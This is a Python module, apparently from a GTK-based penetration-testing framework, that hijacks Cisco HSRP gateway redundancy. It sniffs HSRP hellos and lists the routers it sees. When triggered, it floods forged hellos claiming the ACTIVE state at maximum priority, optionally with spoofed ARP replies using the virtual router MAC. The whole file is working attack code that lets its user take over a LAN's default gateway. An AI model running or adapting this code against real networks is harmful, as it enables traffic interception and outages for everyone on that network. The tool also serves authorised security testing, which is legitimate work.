#       module_hsrp.py
#       
#       Copyright 2010 Daniel Mende <dmende@ernw.de>
#

#       Redistribution and use in source and binary forms, with or without
#       modification, are permitted provided that the following conditions are
#       met:
#       
#       * Redistributions of source code must retain the above copyright
#         notice, this list of conditions and the following disclaimer.
#       * Redistributions in binary form must reproduce the above
#         copyright notice, this list of conditions and the following disclaimer
#         in the documentation and/or other materials provided with the
#         distribution.
#       * Neither the name of the  nor the names of its
#         contributors may be used to endorse or promote products derived from
#         this software without specific prior written permission.
#       
#       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#       "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#       LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#       A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#       OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#       SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#       LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#       DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#       THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#       (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import struct
import threading
import time

import dnet
import dpkt

import gobject
import gtk
import gtk.glade

HSRP_VERSION = 0
HSRP_PORT = 1985
HSRP_MULTICAST_ADDRESS = "224.0.0.2"
HSRP_MULTICAST_MAC = "01:00:5e:00:00:02"

class hsrp_packet(object):
    #~                     1                   2                   3
    #~ 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
    #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    #~ |   Version     |   Op Code     |     State     |   Hellotime   |
    #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    #~ |   Holdtime    |   Priority    |     Group     |   Reserved    |
    #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    #~ |                      Authentication  Data                     |
    #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    #~ |                      Authentication  Data                     |
    #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    #~ |                      Virtual IP Address                       |
    #~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

    OP_HELLO = 0
    OP_COUP = 1
    OP_RESIGN = 2

    STATE_INITIAL = 0
    STATE_LEARN = 1
    STATE_LISTEN = 2
    STATE_SPEAK = 4
    STATE_STANDBY = 8
    STATE_ACTIVE = 16

    DFLT_AUTH = "\x63\x69\x73\x63\x6F\x00\x00\x00"

    def __init__(self, opcode=None, state=None, hello=None, hold=None, prio=None, group=None, auth_data=None, ip=None):
       self.opcode = opcode
       self.state = state
       self.hello = hello
       self.hold = hold
       self.prio = prio
       self.group = group
       self.auth_data = auth_data
       self.ip = ip

    def render(self):
        return struct.pack("!BBBBBBBx8sI", HSRP_VERSION, self.opcode, self.state, self.hello, self.hold, self.prio, self.group, self.auth_data, self.ip)

    def parse(self, data):
        (self.opcode, self.state, self.hello, self.hold, self.prio, self.group, self.auth_data, self.ip) = struct.unpack("!xBBBBBBx8sI", data[:20])

class hsrp_thread(threading.Thread):
    def __init__(self, parent):
        threading.Thread.__init__(self)
        self.parent = parent
        self.running = True

    def run(self):
        self.parent.log("HSRP: Thread started")
        while self.running:
            for i in self.parent.peers:
                (iter, pkg, state, arp) = self.parent.peers[i]
                if state:
                    hsrp = hsrp_packet(hsrp_packet.OP_HELLO, hsrp_packet.STATE_ACTIVE, pkg.hello, pkg.hold, 255, pkg.group, pkg.auth_data, pkg.ip)
                    data = hsrp.render()
                    udp_hdr = dpkt.udp.UDP( sport=HSRP_PORT,
                                            dport=HSRP_PORT,
                                            data=data
                                            )
                    udp_hdr.ulen += len(udp_hdr.data)
                    ip_hdr = dpkt.ip.IP(    ttl=1,
                                            p=dpkt.ip.IP_PROTO_UDP,
                                            src=self.parent.ip,
                                            dst=dnet.ip_aton(HSRP_MULTICAST_ADDRESS),
                                            data=str(udp_hdr)
                                            )
                    ip_hdr.len += len(ip_hdr.data)
                    eth_hdr = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton(HSRP_MULTICAST_MAC),
                                                        src=self.parent.mac,
                                                        type=dpkt.ethernet.ETH_TYPE_IP,
                                                        data=str(ip_hdr)
                                                        )
                    self.parent.dnet.send(str(eth_hdr))
                    if arp:
                        src_mac = dnet.eth_aton("00:00:0c:07:ac:%02x" % (pkg.group))
                        brdc_mac = dnet.eth_aton("ff:ff:ff:ff:ff:ff")
                        stp_uplf_mac = dnet.eth_aton("01:00:0c:cd:cd:cd")
                        ip = struct.pack("!I", pkg.ip)
                        arp_hdr = dpkt.arp.ARP( hrd=dpkt.arp.ARP_HRD_ETH,
                                            pro=dpkt.arp.ARP_PRO_IP,
                                            op=dpkt.arp.ARP_OP_REPLY,
                                            sha=src_mac,
                                            spa=ip,
                                            tha=brdc_mac,
                                            tpa=ip
                                            )
                        eth_hdr = dpkt.ethernet.Ethernet(   dst=brdc_mac,
                                                            src=src_mac,
                                                            type=dpkt.ethernet.ETH_TYPE_ARP,
                                                            data=str(arp_hdr)
                                                            )
                        self.parent.dnet.send(str(eth_hdr))

                        arp_hdr = dpkt.arp.ARP( hrd=dpkt.arp.ARP_HRD_ETH,
                                            pro=dpkt.arp.ARP_PRO_IP,
                                            op=dpkt.arp.ARP_OP_REPLY,
                                            sha=src_mac,
                                            spa=ip,
                                            tha=stp_uplf_mac,
                                            tpa=ip
                                            )
                        eth_hdr = dpkt.ethernet.Ethernet(   dst=stp_uplf_mac,
                                                            src=src_mac,
                                                            type=dpkt.ethernet.ETH_TYPE_ARP,
                                                            data=str(arp_hdr)
                                                            )
                        self.parent.dnet.send(str(eth_hdr))
                        self.parent.peers[i] = (iter, pkg, state, arp - 1)
            time.sleep(1)
        self.parent.log("HSRP: Thread terminated")

    def shutdown(self):
        self.running = False

class mod_class(object):
    def __init__(self, parent, platform):
        self.parent = parent
        self.platform = platform
        self.name = "hsrp"
        self.gladefile = "/modules/module_hsrp.glade"
        self.liststore = gtk.ListStore(str, str, int, str)
        self.thread = None

    def start_mod(self):
        self.peers = {}
        self.thread = hsrp_thread(self)

    def shut_mod(self):
        if self.thread:
            if self.thread.is_alive():
                self.thread.shutdown()
        self.liststore.clear()
        
    def get_root(self):
        self.glade_xml = gtk.glade.XML(self.parent.data_dir + self.gladefile)
        dic = { "on_get_button_clicked" : self.on_get_button_clicked,
                "on_release_button_clicked" : self.on_release_button_clicked
                }
        self.glade_xml.signal_autoconnect(dic)

        self.treeview = self.glade_xml.get_widget("treeview")
        self.treeview.set_model(self.liststore)
        self.treeview.set_headers_visible(True)

        column = gtk.TreeViewColumn()
        column.set_title("Source")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 0)
        self.treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("IP")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 1)
        self.treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("Priority")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 2)
        self.treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("Status")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 3)
        self.treeview.append_column(column)

        self.arp_checkbutton = self.glade_xml.get_widget("arp_checkbutton")

        return self.glade_xml.get_widget("root")

    def log(self, msg):
        self.__log(msg, self.name)

    def set_log(self, log):
        self.__log = log

    def set_ip(self, ip, mask):
        self.ip = dnet.ip_aton(ip)

    def set_dnet(self, dnet):
        self.dnet = dnet
        self.mac = dnet.eth.get()

    def get_udp_checks(self):
        return (self.check_udp, self.input_udp)

    def check_udp(self, udp):
        if udp.dport == HSRP_PORT:
            return (True, True)
        return (False, False)

    def input_udp(self, eth, ip, udp, timestamo):
        if ip.src != self.ip:
            if ip.src not in self.peers:
                pkg = hsrp_packet()
                pkg.parse(str(udp.data))
                src = dnet.ip_ntoa(ip.src)
                iter = self.liststore.append([src, dnet.ip_ntoa(pkg.ip), pkg.prio, "Seen"])
                self.peers[ip.src] = (iter, pkg, False, False)
                self.log("HSRP: Got new peer %s" % (src))

    # SIGNALS #

    def on_get_button_clicked(self, btn):
        select = self.treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            iter = model.get_iter(i)
            peer = dnet.ip_aton(model.get_value(iter, 0))
            (iter, pkg, run, arp) = self.peers[peer]
            if self.arp_checkbutton.get_active():
                arp = 3
            else:
                arp = 0
            self.peers[peer] = (iter, pkg, True, arp)
            model.set_value(iter, 3, "Taken")
        if not self.thread.is_alive():
            self.thread.start()

    def on_release_button_clicked(self, btn):
        select = self.treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            iter = model.get_iter(i)
            peer = dnet.ip_aton(model.get_value(iter, 0))
            (iter, pkg, run, arp) = self.peers[peer]
            self.peers[peer] = (iter, pkg, False, arp)
            model.set_value(iter, 3, "Released")


